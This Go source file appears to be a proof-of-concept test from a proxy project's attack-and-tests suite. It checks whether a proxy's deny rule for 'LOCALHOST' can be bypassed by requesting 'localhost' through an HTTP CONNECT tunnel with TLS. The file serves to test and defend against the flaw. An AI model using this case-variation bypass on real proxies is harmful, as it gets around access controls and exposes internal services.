package main

import (
	"crypto/x509"
	"log"
	"strings"

	"oktopus/attack-and-tests/poclib"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseFlags(args)
	if err != nil {
		return 2
	}
	ok, _ := runAttack(o)
	if ok {
		return 1
	}
	return 0
}

func runAttack(o poclib.RunOpts) (bool, error) {
	pool, err := poclib.LoadCAForMode(o.CAFile, o.ConnectMode)
	if err != nil {
		return false, err
	}

	log.Println("=== control: CONNECT LOCALHOST:9443 (ожидаем deny) ===")
	if allowed := probe(o, "LOCALHOST:9443", pool); allowed {
		log.Println("control: LOCALHOST не заблокирован")
	}

	log.Println("=== bypass: CONNECT localhost:9443 (обход deny LOCALHOST без нормализации) ===")
	if allowed := probe(o, "localhost:9443", pool); allowed {
		log.Println("bypass: ПОДТВЕРЖДЕНО — регистр обошёл dstdomain deny")
		return true, nil
	}
	log.Println("bypass: localhost тоже deny — нормализация ок")
	return false, nil
}

func probe(o poclib.RunOpts, dest string, pool *x509.CertPool) bool {
	raw, br, code, err := poclib.DialCONNECT(o.ProxyAddr, dest, o.ProxyUser, o.ProxyPass)
	if err != nil {
		log.Printf("CONNECT %s: HTTP %d %v", dest, code, err)
		return false
	}
	defer raw.Close()
	tlsConn, err := poclib.TLSOverCONNECT(raw, br, o.ConnectMode, "localhost", pool)
	if err != nil {
		log.Printf("TLS: %v", err)
		return false
	}
	st, body, err := poclib.SendRawHTTPAndRead(tlsConn, "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
	if err != nil {
		return false
	}
	poclib.LogBypassResponse(st, body)
	return st == 200 && strings.Contains(body, "NORMALIZED_OK")
}
